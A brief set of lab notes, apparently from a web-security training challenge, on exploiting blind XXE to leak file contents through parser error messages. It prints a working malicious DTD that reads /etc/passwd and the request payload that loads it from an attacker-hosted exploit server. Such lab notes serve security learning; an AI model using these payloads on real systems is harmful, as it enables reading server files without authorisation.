Exploiting blind XXE to retrieve data via error messages:

    -In this challenge we get our file via error messages.
    -<!ENTITY % file SYSTEM "file:///etc/passwd">
     <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
     %eval;
     %exfil; --> in exploit server

    -<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]> --> in request